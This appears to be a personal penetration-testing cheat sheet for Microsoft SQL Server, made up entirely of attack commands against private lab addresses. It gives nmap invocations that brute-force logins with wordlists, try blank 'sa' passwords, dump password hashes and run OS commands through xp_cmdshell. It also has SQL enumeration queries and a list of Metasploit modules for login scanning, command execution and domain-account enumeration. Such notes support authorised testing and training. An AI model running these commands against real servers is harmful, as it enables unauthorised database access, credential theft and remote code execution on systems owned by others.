# MS SQL
## nmap scripts
nmap -v -Pn 10.2.20.120 -p1433 --script=broadcast-ms-sql-discover  
nmap -v -Pn 10.2.20.120 -p1433 --script=ms-sql-config  
nmap -v -Pn 10.2.20.120 -p1433 --script=ms-sql-info  
nmap -v -Pn 10.2.20.120 -p1433 --script=ms-sql-ntlm-info  
nmap -v -Pn 10.2.20.120 -p1433 --script=ms-sql-empty-password  
nmap -v -Pn 10.2.16.168 -p1433 --script=ms-sql-brute --script-args=userdb=Desktop/wordlist/common_users.txt,passdb=Desktop/wordlist/100-common-passwords.txt  
nmap -v -Pn 10.2.20.120 -p1433 --script=ms-sql-query --script-args=mssql.username=sa,mssql.password='',ms-sql-query.query='SELECT @@version;'  
nmap -v -Pn 10.2.20.120 -p1433 --script=ms-sql-dump-hashes --script-args=username=sa,password=''  
nmap -v -Pn 10.2.20.120 -p1433 --script=ms-sql-hasdbaccess --script-args=mssql.username=sa,mssql.password=''  
nmap -v -Pn 10.2.20.120 -p1433 --script=ms-sql-tables --script-args=mssql.username=sa,mssql.password=''  
nmap -v -Pn 10.2.20.120 -p1433 --script=ms-sql-xp-cmdshell --script-args=mssql.username=sa,mssql.password='',ms-sql-xp-cmdshell.cmd='whoami'  
## internal ms sql commands
SELECT @@version  
SELECT user_name();  
SELECT system_user;  
SELECT user;  
SELECT name FROM master..syslogins  
SELECT name FROM master..sysdatabases;  
## metasploit modules
auxiliary/scanner/mssql/mssql_login  
auxiliary/admin/mssql/mssql_enum (with cred)  
auxiliary/admin/mssql/mssql_exec (with cred)  
auxiliary/admin/mssql/mssql_enum_sql_logins (with cred)  
auxiliary/admin/mssql/mssql_enum_domain_accounts (with cred)  
auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli (with cred)  
